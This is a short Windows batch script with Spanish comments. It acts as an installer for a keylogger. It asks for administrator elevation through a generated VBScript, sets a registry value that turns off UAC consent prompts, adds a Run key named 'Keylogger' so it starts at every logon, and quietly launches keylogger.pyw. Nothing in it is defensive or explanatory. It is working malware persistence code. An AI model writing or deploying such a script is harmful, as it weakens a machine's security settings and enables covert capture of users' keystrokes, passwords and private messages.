@echo off
cd /d "%~dp0"
:: Comprueba si se ejecuta como administrador
>nul 2>&1 "%SYSTEMROOT%\System32\cacls.exe" "%SYSTEMROOT%\System32\config\system"

:: Si no se ejecuta como administrador, solicita la elevación de privilegios
if %errorlevel% neq 0 (
    echo Elevando permisos para ejecutar el archivo...
    goto UACPrompt
) else (goto :skipUAC)

:UACPrompt
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    echo UAC.ShellExecute "%~s0", "", "", "runas", 1 >> "%temp%\getadmin.vbs"
    "%temp%\getadmin.vbs"
    exit /B

:skipUAC
:: Modifica el registro
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "ConsentPromptBehaviorAdmin" /t REG_DWORD /d "0" /f

:: Agrega una entrada al registro para que el script se ejecute al inicio
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Keylogger /t REG_SZ /d "%~dp0autoexe.bat" /f

:: Ejecuta el script
start /B python.exe keylogger.pyw
